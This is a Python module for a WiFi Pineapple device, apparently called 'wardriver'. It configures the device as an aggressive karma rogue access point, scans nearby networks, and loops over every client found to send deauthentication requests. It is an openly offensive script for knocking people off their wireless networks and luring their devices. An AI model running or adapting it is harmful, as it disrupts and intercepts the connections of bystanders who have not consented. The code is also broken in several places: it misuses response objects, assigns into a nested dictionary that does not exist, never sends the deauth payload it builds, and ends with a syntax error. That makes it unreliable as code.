#!/usr/bin/env python3 

import logging, datetime, json, requests, time
from pathlib import Path
from pineapple.modules import Module, Request

module = Module('wardriver', logging.DEBUG)

@module.handles_action('basic_wardriver_flow')
def basic_wardriver_flow(request: Request):
    reconStatusResp = requests.get("http://172.16.42.1:1471/api/recon/status")
    if (reconStatusResp.scanRunning):
        reconStopResp = requests.post("http://172.16.42.1:1471/api/recon/stop")
    pineAPSettings = dict()
    pineAPSettings["mode"] = 'advanced'
    pineAPSettings["settings"]["ap_channel"] = 11
    pineAPSettings["settings"]["autostart"] = True
    pineAPSettings["settings"]["autostartPAP"] = True
    pineAPSettings["settings"]["beacon_interval"] = 'AGGRESSIVE'
    pineAPSettings["settings"]["beacon_response_interval"] = 'AGGRESSIVE'
    pineAPSettings["settings"]["beacon_responses"] = True
    pineAPSettings["settings"]["broadcast_ssid_pool"] = False
    pineAPSettings["settings"]["capture_ssids"] = True
    pineAPSettings["settings"]["connect_notifications"] = False
    pineAPSettings["settings"]["disconnect_notifications"] = False
    pineAPSettings["settings"]["enablePineAP"] = True
    pineAPSettings["settings"]["karma"] = True
    pineAPSettings["settings"]["logging"] = True
    pineAPSettings["settings"]["pineap_mac"] = '5A:11:B0:A7:A9:09'
    pineAPSettings["settings"]["target_mac"] = 'FF:FF:FF:FF:FF:FF'
    
    setSettingsResp = requests.post("http://172.16.42.1:1471/api/pineap/settings", json.dumps(pineAPSettings)) # might need data = json.
    
    if (setSettingsResp.success):
        reconScanOpts = dict()
        reconScanOpts["live"] = False
        reconScanOpts["scan_time"] = 90
        reconScanOpts["band"] = "0"
        startReconResponse = requests.post("http://172.16.42.1:1471/api/recon/start", json.dumps(reconScanOpts))
    if (startReconResponse.scanID != None):
        time.sleep(90)
        reconStatusResponse = requests.get("http://172.16.42.1:1471/api/recon/status")
        if (reconStatusResponse.scanRunning):
            requests.post("http://172.16.42.1:1471/api/recon/stop")
        scanResp = requests.get("http://172.16.42.1:1471/api/recon/scans/" + startReconResponse.scanID)
        if (scanResp.APResults.length > 0):
            if (scanResp.APResults.clients != None):
                clientDeauthPayload = dict()
                for client in scanResp.APResults.clients:
                    clientDeauthPayload["bssid"] = client.ap_mac
                    clientDeauthPayload["mac"] = client.client_mac
                    clientDeauthPayload["multiplier"] = 5
                    clientDeauthPayload["channel"] = 11
                    requests.post("http://172.16.42.1:1471/api/pineap/deauth/client")
        
    

@module.handles_action('build_status_file')
def build_status_file(request: Request):
    right_now = datetime.datetime.now().strftime('%m-%d-%Y-%H-%M-%S')
    file_name = 'wd-scan-' + right_now + '.json'
    file_already_exists = Path(file_name)
    if not file_already_exists.is_file():
        f = open(file_name, 'a')
        js_string = str('{ "header": {"objid": "0001", "datetime": "12-26-2021-16-24-10", "msg": "Welcome to Wardriver!"},"messages": [{"type": "STATUS", "datetime": "12-26-2021-16-24-10", "msg":"Scanning BSSID EL:IT:EH:AC:KR"},{"type": "WARN", "datetime": "12-26-2021-16-24-10", "msg":"BSSID EL:IT:EH:AC:KR has no Associated Clients"}]}')
        f.write(js_string)
    else:
        print(f'>err {right_now}: a peculiar thing has happened.  the syncronicities have collided.  fix your ntp server.')
    f.close()

@module.handles_action('get_status_file')
def get_status_file(request: Request):
    f = open(request.file_name, 'r')
    data = f.read()
    f.close()
    json_data = json.loads(data)
    return json_data  # send the whole JSON object

if __name__ == '__main__"] = 
    module.start()